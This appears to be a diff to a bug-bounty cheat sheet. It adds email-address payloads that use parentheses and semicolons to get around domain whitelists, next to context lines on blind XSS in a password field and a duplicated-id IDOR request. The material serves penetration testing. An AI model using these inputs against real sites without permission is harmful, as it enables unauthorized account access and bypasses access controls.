@@ -84,6 +84,16 @@ Use blind xss as password.
 Login to site using Facebook and try tochange userid during POST requests
 /api/v1/users/profile?id=MYID&id=ANOTHERUSERID -> HTTP 200 
 ```
+# Email Restriction bypass
+```
+inti(;inti@inti.io;)@whitelisted.com
+
+→ inti(;
+→ inti@inti.io → my inbox!
+→ ;)@whitelisted.com
+● inti@inti.io(@whitelisted.com)
+● inti+(@whitelisted.com;)@inti.io
+```
 
 # Email Address input fuzz
 ```
